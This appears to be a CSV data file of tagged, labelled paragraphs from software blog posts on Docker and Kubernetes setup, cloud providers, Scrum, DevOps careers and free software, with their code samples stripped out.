1947,"One way to build test benches is to have each individual case to test as a separate test. The test can set up the components state, provide any dependencies as required and then display the component inside a WPF Application. Heres one example of the kind of tests we wrote for SQL Compare which follow this pattern: This test sets up an Error Window component to display a particular error message. The text passed in is designed to wrap in the actual component, so we check that everything is displayed correctly. Additionally, we pass in a fake handler for the report error event. By clicking on the report error button and then checking that the message box from the Message Box.","['React', 'Software Development', 'Programming', 'Testing']",13
1948,"How can we access our Nginx instances? In order to do so, we need somehow to expose the containers that include our Nginx instances and route our browser to those Docker containers. We can achieve this in multiple ways, but I think the most common ones or the first that come to mind would be:1. As a result the services would be available on some random or dedicated ports on our host machine like 127.0.0.1:8000 and 127.0.0.1:9000. It works, but its not good enough because Its not scalable for multiple services, as after some days we will not remember which port belongs to which container Usually we do not use ports to access web services, we use domain names and we want our development enviroment to replicate our production envionment as closely as possible2. Go old-school and apply bad techniques from web2000. docker inspect each container to get their ips and hardcode them in /etc/hosts Super hacky and not working after a recreation of any of those containers as they will get new ips3. Back in the days I was using webmin to configure through a web UI the locally installed services like dns. And it works quite nice, but We are living in a dockerized era and usually we dont want to pollute our host machine with server setups like webmin and dns Tedious to replicate on multiple machines across a development team More manual configurations = more things to go wrong One might not have access install those apps on the host machine4. Use an all-included proxy like Telerik Fiddler. Also works quite nice, but Its a standalone app, so once again extraneous stuff to permanently install on the host machine Linux and OSX versions are still in beta One might not have access install it on the host machine Can a reverse proxy save the day? One tool that can help us in this situation is a reverse proxy, as it can route our requests to different services based on some predefined rules. jwilder/nginx-proxy is a dockerized, efficient reverse proxy with small footprint that can also be used in production.","['Docker', 'Localhost', 'Mocking', 'Nginx Proxy', 'Domain Names']",11
1949,"Cool, but this setup is still not good enough because:1. We are touching /etc/hosts, a system configuration file on the host machine, which means that We can break the networking in our system One might not have access to edit this file at all2. After every new web service addition to our stack we will have to update /etc/hosts again3. If we want to have multiple self-signed certificates for different web services, we would need to add them one by one into the browsers certificate storage Docker based lookup for hostnames The previous situation can be resolved by the use of mitm-nginx-proxy-companion, which contains jderusse/docker-dns-genan auto-configured dns server, and mitmproxya man-in-the-middle proxy for HTTP and HTTPS. The only extra part that is needed is a browser proxy extension which will send the requests through that proxy. After the setup, the whole route of our web requests will look like this:1. We try to access a local development domain in a browser2. The proxy extension forwards that request to mitmproxy instead of the real internet3. mitmproxy tries to resolve the domain name through the dns server in the same container If the domain is not a local one, it will forward the request to the real internet But if the domain is a local one, it will forward the request to the reverse proxy4. The reverse proxy in its turn forwards the request to the appropriate container that includes the service we want to access Lets add mitm-nginx-proxy-companion to our __url__ stack and clean up /etc/hosts from the previously added entries.","['Docker', 'Localhost', 'Mocking', 'Nginx Proxy', 'Domain Names']",11
1950,"The problem with the computer is that it operates at a completely different level of abstraction to a human. This is not necessarily a bad thing, and is in large parts what made computers so useful. Given the correct instructions, it will execute any procedure with speed and accuracy far surpassing the capability of any human being. Its never grumpy because it has had an argument with its significant other.","['Programming', 'Computer Science', 'Human Behavior', 'Psychology']",5
1951,"On the flip-side, of course, given incorrect instructions, it will happily do just the same. Unlike a human, it has no idea what it is actually trying to accomplish. Its job is simply to execute a set of instructions. It will never notice if it is doing the wrong thing. It will not question its masters.","['Programming', 'Computer Science', 'Human Behavior', 'Psychology']",13
1952,"So (full disclosure: this is the main hypothesis of this piece), the programmer slowly adapts to become better and better at thinking like a machine. Because thats what we as humans are good at.","['Programming', 'Computer Science', 'Human Behavior', 'Psychology']",5
1953,"Just a short story for everyone. I started with HTML for building forms. Then when I learned I need a backend to submit the data too, I had to learn the easiest option at the time, which was PHP. With that, you cant escape it, you need to know My SQL too. All these were easily made available by paid shared-hosting at the time. Yeah, I got then a Bluehost and a Host Monster account. I wonder where they are now? Actually, there were free web hosts for the extreme starters.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",19
1954,"Since theres a server now, all one needs to do is upload the files through FTP and you see your changes. Internet then, especially here in the Philippines, was like turtle-slow, which is practically what it is today where I live. Oh boy, dont get me started with ISPs here in my country. Im behind a proxy and theres no way around it. I needed to find a solution to host everything locally. One then would probably try to have PHP and My SQL installed but Im on Windows. In Linux, its just apt-get install and voila. I had no time to learn how to compile things for a Microsoft workstation. Others were using Dreamweaver and some IDEs. But I never enjoyed it as they were too slow on my measly PC then. I just needed to work with an efficient editor, which was Notepad++ for me during those times.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",7
1955,And Ive been using it still today for quick projects which need to be on LAMP. But then you still have to do the FTP transfer. Now comes Git to the rescue. This allowed me to just send delta changes over web traffic. All I had to do to update something was SSH into a server and then do a git pull. Or you can just automate it with webhooks using your Git provider of choice. Whats important here is youre not transferring an entire Word Press or maybe php BB app over FTP.,"['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",7
1956,"I never thought that web development will be this fun. What I know for sure then was that web technologies are ever changing. In the past, it was mostly j Query. Then, there came Backbone, Handlebar, requirejs then Coffeescript. Now we have all these shiny front-end frameworks, Angular, React and Vue JS just to name a few. And were just touching the development part. Theres still the marketing aspect of our app but thats for another topic.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",19
1957,"But out of the blue, something broke. I know Im technical enough and I should be able to solve it. But Im not the guy who will go dig so deep when it falls on the category impractical or not worth it. To cut short, suddenly, Im unable to host something on a host folder path. I already did re-installs of Vagrant. Multiple clones after, I gave up. I cant accept the fact that suddenly, it will fail on something trivial. I just put the blame on me having a Windows workstation with a virtualized Linux guest. And sharing symlinking of folders and files between these two is never perfect.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",7
1958,"I remember a colleague in the past who totally scrapped Windows and went full-pledged to work on an Ubuntu desktop. I have games in it like Dota 2. Although Im not playing anymore, I dont want to lose it. Also, there are a lot of things I love in my Windows 10 machine. I want someone to sneak in and see my files. She wont be comfortable on a Linux.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",16
1959,"Ive been ignoring it for the longest time but since Im in a situation that I need another solution, Im jumping in. Also, I know it will help in scaling easily the app that Im working on. For the clueless, Docker will help you run an app/stack on any host that has a docker engine. Instead of working with bigger machines, you will be working with relatively smaller images and containers. But you really have to fully understand your IPs and ports as youll be doing caching, balancing, etc. If not, you will have to sail a bit more time just to get things done.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",11
1960,"Back to what this post is about. This guide is for those with Windows 10 Pro. I tried Docker on Virtualbox but Im not liking it. In Windows, just enable Hyper-V and youll be good to go. After this, you cant use Virtualbox, unless you will switch back Hyper-V off then do a restart.","['Docker', 'Windows Machine', 'Web Dev On A Mobile Phone']",7
1961,"Create the following folder and files: Now open __url__ and add the following code (make sure to replace <project-id> in the image definition with your own: For service.yaml, enter:which creates a doorway into our Docker container. For ingress.yaml, enter: This will create the HTTP load balancer and point it to the Node Port service. Finally, for __url__ enter: Now we can deploy these services to our Kubernetes cluster using the Kubernetes CLI. Just before we do that, we need to configure kubectl with our cluster deployed in Google Cloud. Run: Now run the following command to deploy the services: And all the services will deploy! If you navigate to the Kubernetes Engine in the Google cloud console ( __url__ deployment.","['Docker', 'Kubernetes', 'Kubernetes Engine', 'Scalability', 'Continuous Integration']",7
1962,"Ill start with explaining the podscaler.yaml. This sets up what we call horizontal pod scaling (HPA). A pod is essentially a tightly-coupled group of containers that share the same hardware. Each node (or machine) can run multiple pods depending on the resources available. The HPA schedules more pods if the current pods are being over-utilized and removes pods if they are being under-utilized, but it will not scale the number of nodes. The nodes are simply VMs controlled by Google Cloud so this needs to be configured through that, rather than Kubernetes (so now you see where the cluster autoscaler comes in).","['Docker', 'Kubernetes', 'Kubernetes Engine', 'Scalability', 'Continuous Integration']",11
1963,"The last step is to create our __url__ file, which will tell Cloud Build how to build and deploy our application. Create the file:and add the following code: Theres a lot going on in the file above so lets walk through each step defined. In each step, the name argument defines the CLI to use to run the command.","['Docker', 'Kubernetes', 'Kubernetes Engine', 'Scalability', 'Continuous Integration']",7
1964,"The next step builds our Docker image and names it. The SHORT_SHA is the first 7 characters of our commit SHA, which will differentiate each of our builds from each other. After that we push the Docker image to the container registry. The next step searches for the string image: IMAGE in our k8s/ __url__ file and replaces it with image: __url__ this.","['Docker', 'Kubernetes', 'Kubernetes Engine', 'Scalability', 'Continuous Integration']",7
1965,Now navigate to the Cloud Build history ( __url__ API.,"['Docker', 'Kubernetes', 'Kubernetes Engine', 'Scalability', 'Continuous Integration']",7
1966,"In a secure and private Kubernetes (K8S) cluster in Google Cloud Platform (GCP), it is important to make sure that you are using private IPs and right-sized IP ranges for your current and future scaling needs. A bad network design is very difficult to fix especially after the services started running in production. The story Securing Your Kubernetes Cluster in Google Cloud Platform covered the basics of the setup. Detailed coverage of the IP address ranges in the K8S cluster deserves a story on its own and this one is trying to achieve that. Before jumping into the matter, it is better to do a deep dive into the K8S fundamentals and K8S documentation provides a lot of materials for your needs. In addition to that, the story Kubernetes 101: Pods, Nodes, Containers, and Clusters by Daniel Sanche serve as a quick refresher of the subject.","['Kubernetes', 'Gcp', 'Cidr', 'Google Cloud Platform', 'K8s']",11
1967,"It is important to have non-overlapping IP address ranges for all of the above resources. You should have the scaling requirements identified very early on before even architecting and designing your K8S infrastructure. The IP address range selection depends a lot on those requirements. All the configurations related to GCPs infrastructure takes the IP address ranges in the CIDR notation. When you are coming up your IP address ranges for your VPC and K8S infrastructure, it is advisable to use a CIDR calculator so that you are not overlooking and making mistakes in IP address calculations. There are many such tools available and CIDR.xyz is being used here while writing this story. The Terraform script captures all the details including the IP address ranges of the private K8S cluster in discussion here.","['Kubernetes', 'Gcp', 'Cidr', 'Google Cloud Platform', 'K8s']",11
1968,"The Internet today is a vast, ever-expanding territory for which we have built great vehicles, but no modern maps. Instead, what we have is the equivalent of 15th century mapping technology to navigate in a world that lets us, and perhaps even requires we move at 21st century speed. We have no equivalent of GPS for the information landscape we inhabit. All we have are scraps and notes we take along the way, feeble markings on dog-eared charts that become outdated almost as soon as they are created.","['Design', 'Augmented Reality', 'Software Development', 'Mixed Reality', 'Software']",17
1969,"In response, operating systems started to include a Do Not Disturb feature that can be activated manually or automatically at certain times (e.g. This is a useful feature, but the question we should ask ourselves is: Why it is so necessary? It isnt just the number of services or apps that counts here. It is also that these apps and services lack or ignore simple elements that should be at the forefront in a world in which we are awash in devices and sensors. Awareness of context and time, along with adaptation to the circumstances of the person using the software are not common design parameters in our software and services. In the few cases when they are considered they are not given as much importance as they deserve, or they are implicitly sidestepped in the service of revenue or growth or some other internal metric. This is not a bad thing in and of itself, but it should be an explicit decision (even explicit to people using the product) and it rarely is.","['Design', 'Augmented Reality', 'Software Development', 'Mixed Reality', 'Software']",16
1970,"AWS is the oldest public cloud provider with the widest range of products, compute and data storage options and managed services. AWS Marketplace is also the largest marketplace for third party applications and appliances. They also rapidly iterate to continuously add a substantial set of product features. Highly driven by customer feedback, their new services provide close integration with their core services like IAM, KMS etc. They have a strong focus on security and architecture best practices. Their enterprise frameworks such as the Well-Architected Framework and Cloud Adoption Framework have been developed from their experience with large enterprise customers. Besides their mainstream services, they are also known to release unconventional services as Snow Mobile (data transfer appliance in a truck), Robo Maker (robotics framework) and Ground Station-as-a-Service (for managed satellite data download). This keeps customer interest piqued and has potential to open up entire industries. Their 51% market share is a proof of that. That said, they arent the cheapest cloud on the market. They also dont seem to be worried about providing deeper container offerings. Their EKS (managed Kubernetes) service was relatively late to the market. Instead, they seem to be placing bets on Micro VMs (Firecracker) and managed functions.","['Cloud Computing', 'AWS', 'Azure', 'Google Cloud Platform']",10
1971,"AWS has improved its networking services portfolio over the last decade. It started with VPC and related network features such as security groups, network ACLs and Internet Gateways. At the time, users still had to configure their own NAT servers, bastion hosts etc. AWS has listened to customer feedback and gradually added these as managed network services to its portfolio. AWS now provides a managed NAT gateway, VPN Gateway, Transit Gateway, Direct Connect Gateway etc. They recently also announced a managed Client VPN service. This removes the need for customers to deploy Open VPN servers to manage access to cloud VMs.","['Cloud Computing', 'AWS', 'Azure', 'Google Cloud Platform']",11
1972,"Microsoft had lagged behind AWS in the public cloud game, but it focused first on Saa S and Paa S offerings as its strengths lie in both enterprise and consumer software. Microsoft initially focused on Paa S services for Azure. These were focused on their existing base of Microsoft developers. Over time, Microsoft expanded focus to both Linux and Iaa S services. This also reflected in their re-branding Azure from Windows Azure to Microsoft Azure, and Microsoft loves Linux campaigns. Over time, Microsoft has also made Azure more startup friendly and built out API support for its various services. However, despite the breadth of its services, Microsoft lags substantially behind AWS in enterprise adoption. Large enterprises that already have existing Microsoft relationships remain a large part of the user base, though Azure is seeing robust growth in year-on-year revenue.","['Cloud Computing', 'AWS', 'Azure', 'Google Cloud Platform']",16
1973,"When it comes to SQL and No SQL databases, Azure has a fairly well rounded set of services. It provides managed MS SQL Server and SQL Datawarehouse. Azure also provides managed databases for My SQL, Postgre SQL, and Maria DB. Azure Table is a managed key value store, whereas Cosmos DB provides multi-model, globally distributed No SQL database with multiple consistency models. It provides an API compatible with Mongo DB, Cassandra, Gremlin (Graph) and Azure Table Storage. If you need to run multiple managed data models, including document, graph, key-value, table, and column-family data models in a single cloud, Cosmos may be the way to go. Azure cache for Redis rounds off the offerings with a managed cache.","['Cloud Computing', 'AWS', 'Azure', 'Google Cloud Platform']",8
1974,"Developers are used to being able to develop locally or on a shared development server. Serverless by nature of being something managed by another company will throw a wrench into that setup. Some services are supported by local execution entirely and some are not. AWS Lambda for example has a very nice companion library Lamb CI that allows you to execute your code locally using the command line while Google has a robust Emulator to test full cycles locally. Similarly there are mock applications for many AWS services including Dynamo and S3 and there are tools to mock Google Bigquery and Storage, so make sure to explore those. Other services like AWS Transcoder do not have any local equivalent so testing applications that depend on them will be a challenge.","['Serverless', 'Google Cloud Platform', 'AWS', 'Services', 'Cloud Computing']",10
1975,"On July 7th the Scrum community gathered in Amsterdam (The Netherlands) for the 5th edition of Scrum Day Europe. This years theme was the next iteration. Therefore we looked back to see what Scrum brought us the last 20 years, but also looked forward into the future of Scrum. Naturally, the evaluation was done via a retrospective. The goal was to generate insights and define improvements for the Scrum framework from the Scrum community. Every participant contributed and provided input; thereby it proved to be a true community event! During the day we asked everyone to answer 5 questions: In a series of blog posts Ill share the answers weve received on these questions. This final blog post will be about what the participants of Scrum Day Europe considered a small improvement to the Scrum Framework. Ill share the outcome of the Retrospective and my personal opinion. Of course Im also interested in your point of view! According to the participants, possible small improvements to the Scrum framework are: Adding the Definition of Ready to the Scrum Guide Adding an appendix to Scrum Guide with what to do when Providing a Scrum starterskit for new colleagues Creating an EBM presentation for management/organization Offering practices to improve soft skills Creating an experiment canvas > hypothesis driven Introducing a strategy clock Humanizing the workplace Setting up a Definition of Fun Creating official profiles of all the roles based on ICT competency standards Out of all the suggestions made by the participants I would like to focus on the suggestion of adding the Definition of Ready to the Scrum Guide. Its a question I get during every Professional Scrum Training: First, lets clarify what is meant with the Definition of Ready. While the Definition of Done is used to assess when work is complete on the product Increment, the Definition of Ready is used to assess if Product Backlog Items (PBIs) are ready for Sprint. Often the acronym INVEST is used as a checklist. PBIs are ready for Sprint when they are independent, negotiable, valuable, estimable, small and testable. Although such a checklist can be a useful instrument to improve the quality of PBIs, Im not a big fan of the Definition of Ready. Quite often it becomes a contractinstead of a guidelinebetween the Development Team and the Product Owner. Only PBIs that meet the entire checklist will be selected for the Sprint Backlog. Basically the Development Team is using a sequential, phase-gate mindset which only increases unnecessary process overhead.","['Agile', 'Scrum']",1
1976,This is the 4th blog post about the Scrum Day Europe 2016 Retrospective. In the first blog post Ive described the strength of Scrum. The second blog post was about the desired focus of Scrum. The third blog post described the frustrations people experienced with Scrum so far. The fourth blog post offered examples of what it is that connects people to Scrum. This final blog post contains my view the Definition of Ready as a possible improvement to the Scrum framework.,"['Agile', 'Scrum']",1
1977,"Orthogonal peers In this age of microservices and countless apps, its possible that nobody is familiar enough with your language or specific domain to be able to offer useful feedback, and rather than offer fluff, choose to offer nothing at all. As people specialize more and more, they become less and less capable of aiding the people next to them. Sometimes languages can be similar enough, like Python and Ruby, or Kotlin and Scala, or databases similar enough, like My SQL and Postgre SQL, that its easy enough to offer good reviews, but in separations like web frontend (e.g. SPA) to backend, or even to infrastructure, the crossover is tenuous at best.","['Software Development', 'Isolation']",9
1978,"Depression Perhaps the most devastating of consequences is the personal toll it can take on the individual. Working alone for long periods of time can lead to loneliness, and eventually depression. Not all people will fall into this, as some people rejoice in being left entirely to themselves, but humans are generally social creatures, and work is no exception. Going to work becomes more difficult, dealing with even minor problems can become a giant obstacle, and progress can come to a grinding halt. After all, nobody really knows what youre doing, or not doing. With nobody to reach out to who will understand your problems, you internalize the damage which compounds with interest, ultimately yielding high returns of nothingness and suffering.","['Software Development', 'Isolation']",4
1979,"Engender skepticism This one might seem counterintuitive. After all, we spend so much effort trying to build up trust with others. Pushing other people to give you critical feedback and to ask difficult questions can help to break through the ice by emphasizing to others your fallibility, and if people feel more comfortable giving you feedback, they will likely do so more often. This can be quite difficult due to a few conflicts of interest involving people wanting to preserve the peace and not wanting to criticize others, as well as you not wanting people to distrust you, but will ultimately lead to a much healthier working relationship, and can cure the isolation. Sometimes this requires giving some unsolicited feedback to others, which will free them of inhibitions of returning the favor. As long as it doesnt become a tit-for-tat, this can be a valuable way to get the conversation flowing.","['Software Development', 'Isolation']",4
1980,"That being said I moved into a job where I was administering over 500 VMs. But wait, I was volunteered to be part of a huge AWS buildout in the cloud. I forget that VMWare farm and those EMC SANs and all that other data center nonsense. I knew so little about it, but it came quickly apparent to me that it was wild and new and all the rules of engagement were very different.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",10
1981,"A month or so later, Justin came in. He was the new unicorn Dev Ops rockstar (IT is just full of cool slang). Justin knew AWS, Chef, all of it. His seat was right next to mine. He opened his Mac Book (of course he wouldnt be on a PC) and after an hour, he was pulling in sprint tickets, writing tests and working on Chef cookbooks. I peeked at what he was working on a few times that day. He was jumping between terminal screens, committing code, simulating builds in test-kitchen. This is all on day f**king one.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",6
1982,"The next day Justin came in and sat down next to me. He was jamming at his awesome code and I turned to him and said, Hey dude, I got to ask. Did you go to school for software development? How did you learn all this stuff? I genuinely wanted to know where these unicorns came from. His response was a knife in my chest.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",2
1983,"After a lot of drinking, I came in the next day with the attitude of how hard can it be. After all, these werent unicorns, they were IT folks just like me. At first I wondered what kind of training I could take. Maybe I just needed to get a few certs in this stuff and Id catch up to them. That thinking got me far, but not nearly far enough, fast enough. I decided to just dig down to basics and get my hands dirty.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",2
1984,"A few months later, two more Dev Ops guys joined our team, Lars and Roman. By this time, Id learned about Agile and had a basic understanding of git workflows, building a Jenkins job, writing a few RSpec tests, but for the most part I was still new and got lost in the methodologies quickly. It often felt like I was learning to drive in reverse, in England with the music blasting. I was overwhelmed and really had to resist just cheating and going back to using a GUI or resorting to my powershell scripts. I was like an addict who used wizards and a mouse for far too long. But I was determined, and my teammates were great.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",2
1985,"Im still not very good, but Im writing all the Windows cookbooks (since everyone on my team refused to touch Windows). I could take on sprint work. Suddenly, I was okay at this Dev Ops thing.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",2
1986,"It was time to go out in the wild. I applied for a job I had no business getting. They used Ansible, Python, Perforce, and it was 100% Linux (which I was not comfortable with at all). As I was interviewing for the job, I told the hiring manager straight up, I dont know your entire stack, but I can do this job. After all, if there is one thing I learned in the last year was that I can do whatever it takesthat is the Dev Ops mentality. The challenges of learning the new world order of IT were not so impossible any more.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",2
1987,"Less than a month in I was more comfortable cruising around in Linux, writing Ansible playbooks, and creating scripts in Python. There was a point where even I couldnt believe that I pulled off my bluff. Then I suddenly became the unicorn on my team. I was in the strange place where exactly half the team were operations (admins) and the other half were developers. There I was in the middle, figuratively somewhere in the middle, of both teams.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",2
1988,"I interviewed at a startup that was walking distance from my home. Beer in the fridge, bike racks, dart boards, it was amazing. My potential teammates were extremely sharp. They were doing all the cool stuff, 100% in AWS, CI/CD, immutable blue/green deployments, all Linux, using Puppet, ELK, containers, Mongo DB, and the list goes on. It was a real Dev Ops shop. Again, I didnt know about 85% of the solutions but I used the same line,Well, I got the job and man was I excited. Id finally made it into that unicorn stable and was going to do all the cool stuff the cool ways. I was going to learn this new set of technologies from really smart folks, but the difference now was I was able to understand the Dev Ops practices.","['DevOps', 'AWS', 'Career Transitions', 'Operations', 'Coding']",10
1989,"We should first test ansible conectivity to all nodes: Ansible ""pings"" (i.e. tests SSH connectivity) all hosts in the inventory file. Output should be something like: All hosts were reached we should now run the ""install-dockeree.yml"" playbook: You can test the engine setup by running an ""ad-hoc"" ansible command: All hosts should return something like this: Docker UCP installation can use certificates from a volume with a reserved name (""ucp-controller-server-certs""). You can run the commands below to create such volume remotely (on the ""manager"" host) and populate it with new certificates generated by Certbot (also known as Let's Encrypt): Note: you will have to replace the e-mail and domains (in bold) above, naturally. Also notice that the container's ""/etc/letsencrypt"" is bound to the external volume. UCP installation looks these certificates with different paths, so the very last line just copies the certificates to another place within the same volume.","['DevOps', 'Docker', 'Docker Swarm', 'Kubernetes', 'Digitalocean']",7
1990,"In the waterfall process, there would be a requirement gathering stage where a manager would talk to the product manager to work out the requirements. Then the team would review the requirements and maybe adjust them a bit. Eventually, the design starts as one senior developer would write up a design doc. Then the rest of the developers would read, comment, and ultimately sign off on the design before any development could start. If the feature was very complicated, the design might take days to write up before reviewed. Then a test plan is written according to requirements and the design. The rest of the team would read, comment, and ultimately sign off before the QA engineers created tests.","['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",0
1991,"To fix this issue, I transitioned the team to focus on one or two features at a time and having design meetings where everyone would contribute by debating on potential solutions. The team hashed out enough details to get started, which significantly lessened the time spent on requirement review and design write up. Ultimately, this process raised the quality of code because many people were contributing instead of a single person designing the feature. People would think up of different ways to implement the feature and debate on what approach to take. Sometimes, the design would look drastically different from when the team started on it, but the code quality was much better. People were focused, began to work together more often, communication improved, and knowledge was being spread.","['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",0
1992,"Story points are abstract units based on complexity. They have a steep learning curve as many people find it difficult to let go of the hour estimates because time is a tangible concept. A person can look at the clock and see the seconds, minutes, and hours passing. A pattern I noticed was some people used story points as time. The first common issue I saw is using story points as hours of work, and the other problem is translating story points to hours. Both of these methods are common pitfalls because they are incorrect ways to use story points. To get my team passed the hour issue, I chose the Fibonacci number sequence and started with planning poker to abstractly establish what the user stories were worth. The first sprint was rough because the estimates were all over the place, but they began converging over time as people grasp what the worth of the story point values are.","['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",14
1993,"The big secret is there isnt a generic story points value system. Its a perceived value that the team establishes and the critical point is to keep the group relatively the same and estimating the same way over and over. Adding or subtracting team members affects the value of the story points because theres a different group of people. The estimation will be different, but it will stabilize over time again. The other crucial concept is to use metrics especially the sprint velocity. After a few sprints, the average sprint velocity gets established which is the key to forecasting the number of story points the team can burn in a future sprint. The essential concepts are: keep the team members relatively the same, estimate in the same way, and forecast based upon average sprint velocity.","['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",1
1994,Another steep learning curve is going to user stories from task assignments. Its another concept that people have trouble adjusting. A task is something like create a database to hold passwords for the application while a user story is more of a description of a feature from a users perspective. Does this user directly interact with the database?,"['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",9
1995,"User stories follow a basic template of: An example is: As an administer, I want the ability to change user passwords so that I can help users reset their passwords. Underneath this statement, it implies that there are components such a database, user accounts, and maybe a UI. There isnt a user story for user account types or UI? As a user, I want to be able to log into my account so that I can access my customer data. Writing user stories is a great way to brainstorm what needs to be done to complete the feature/epic.","['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",19
1996,"Initially, productivity dipped in the first few months as the team was adjusting to a new paradigm and process. Some of the hurdles needed Agile training to help move the team over from the waterfall method, but the benefits became apparent as the team became more reliable, flexible, and faster. Features were estimated more accurately with story points. Planning was reduced with user stories and changes to the design process. The shorter sprint allowed more flexible adjustments to priorities or information discovered. Overall, the team was given more autonomy and performed much better than it did before the changes.","['Agile', 'Software Development', 'Software Projects', 'Scrum', 'Software Process']",1
1997,"I spent the first half of high school not caring about anything, grades included. In my second-to-last year, many people began taking pre-SATs, a preparation for the American standardized test to apply to university. Ive always disliked standardized tests, not just because theyre a terrible indicator of human capacity, but because theyre a waste of time and effort. I found out that I could avoid the test entirely if I chose to go to community college first, and then transfer to a university. Not only could I dodge the ridiculous test, but the cost of community college was an order of magnitude cheaper. American universities are expensive, to the tune of tens of thousands of dollars, so this was no small thing for a middle class family.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",2
1998,"In Reality I met some of the smartest most successful people I know in community college. I had great teachers that laid the foundations for what would be my future in software. I saved a ton of money living at home and paying less tuition. Without caring about going to a brand-name school, the focus was more heavily on learning and practicality, including soft skills that would later help me in the industry. The focus was less on rote memorization and flooding students with homework, and more on the learning process and fundamentals. Hearing the tales of being heads-down in university from my high school friends right from their first year, and the endless worrying about impossible tests, I felt I had dodged an unnecessary bullet. The learning at community college, far from being subpar, was meticulous but practical, such that when I finally transferred to university, it seemed simple by comparison.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",2
1999,"Fear of Failure But I was missing out on the astronomical salaries of Silicon Valley while off in Japan. I didnt have access to the same conferences and people they did, and I might be limiting myself. I wasnt making a name for myself in open source. Was I throwing away my career? In Reality Regardless of where you are on Earth, learning is learning, and the skills I would pick up there would form the basis of my career in web. I had a chance to learn from and with some of the best engineers I have ever worked with. Most open source work takes place on the web, and with a solid connection, you can do it from anywhere. Silicon Valley tends to drive a fear of missing out, but many aspects of it are completely available elsewhere. Besides, Tokyo is not always sunshine and rainbows either.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",2
2000,"But after each failure I learned something, and I got better. Nothing was ever perfect and there was always more to be done, but I began to celebrate the little triumphs (and the big ones). The team eventually grew, and focusing on quality over quantity had paid off, as we got to hire some amazingly talented people. I didnt get fired, but I did get promoted. More responsibility brought more stress and more chances to fail, but also better-feeling successes.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",4
2001,"My biggest failures led to my biggest successes. Many people think failure is a goal because Silicon Valley celebrates failure. You should never aim to fail, but if you do, make sure you learn something from it and do better next time. Avoiding failure altogether is even better, but reality dictates thats not always possible.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",4
2002,"A few jobs later, I was at an impasse: the amazing lifestyle of Tokyo, or the amazing career growth of Silicon Valley. Now I must stress that although to many this is a false dichotomy, in my case the scales were heavily tilted toward SV due to family, familiarity and my desire to reconnect with the perceived heart of tech. I spent a while getting used to the US again. America is a strange place when you first come back, and Silicon Valley even stranger. I was shocked at the size of food portions, the large apartments, tall ceilings, and all sorts of other things. Maybe Ill write about that sometime if its of interest to anyone.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",2
2003,"Fear of Failure Not wanting to move to San Francisco, I stayed in the South Bay and worked remotely for a company up there. Things were going well for a while, but I began to think that I was doing too much of the same thing. At this point Id been working doing mainly backend web development for 5 years or so. The world seemed to be shifting toward deep learning, data analysis, serverless architectures, containers and all other manner of tech. What if I was in an obsolete field, on its way out? Had I let myself rot too long in Tokyo? Was I going to be jobless? Were people in the office doing better career-wise because they were not remote and had more face time? Was I stagnated by not moving to San Francisco? In Reality Staying out of San Francisco has been a great decision every step of the way. I managed to avoid the crazy rents, the spending on outings, and the strange and disturbing social bubbles that exist there (the South Bay has its own set of bubbles with their own tradeoffs).","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",2
2004,"At every step of my professional career I have been scared of being left behind, afraid of failing, afraid of not doing well enough, afraid of falling by the wayside and never getting back up. Each and every time, these fears have been proven to be overblown. I still feel the paranoia, the fear, but now I balance it with a dose of reality. A good friend of mine once told me things are only ever as bad as you think they are and hes often right. As professionals, we always want to do better, we want to avoid failure, and we want to keep growing. I think its inevitable that a voice in our heads is always warning us of impending doom. This may also be a strength, but when blown out of proportion, it can be debilitating.","['Development', 'Professional Development', 'Software', 'Personal Development', 'Fear Of Failure']",4
2005,"Back in the early 2000s I got into a discussion about the relative merits and problems with Free and Open Source software. One of the points of discussion was the first freedom identified by Free Software: This same freedom is identified in article five of the Open Source Definition. The point of that discussion was about the moral position of free and open source software as it related to proprietary software. My counterpart proposed that any software that was not free or open source was morally evil, while I defended the rights of creators to determine the bounds of their softwares use. I still stand by my position and will not retread it here. Any software developer has the right to define how and by whom their software can be used. But, I also believe that free and open source software is superior to proprietary software for many reasons and in many circumstances. The most important of those reasons is freedom.","['Open Source', 'Free Software', 'Freedom', 'Software Libre', 'Software Licensing']",16
2006,"Taking action necessitates accepting the consequences of such action. Sometimes those consequences are not to our liking, and still other times we have no control over the consequences. The trouble arises when the consequences become so objectionable that we think the problem is with freedom itself. Thats the trap that is always lurking just beyond our view, tempting us to restrict freedom for the sake of our comfort. But, the truth is that to gain our comfort we have to give up our freedom entirely.","['Open Source', 'Free Software', 'Freedom', 'Software Libre', 'Software Licensing']",4
2007,"At the end of the day freedom is the problem. But, freedom is worth having, even in the realm of software. Freedom means that with the same tools some would employ for evil we have all the rights to employ those same tools for good. But, we cant maintain the freedom to do good effectively without risking freedom for others to do evil. That is the risk, but, in this case, I think it is a risk worth taking.","['Open Source', 'Free Software', 'Freedom', 'Software Libre', 'Software Licensing']",16
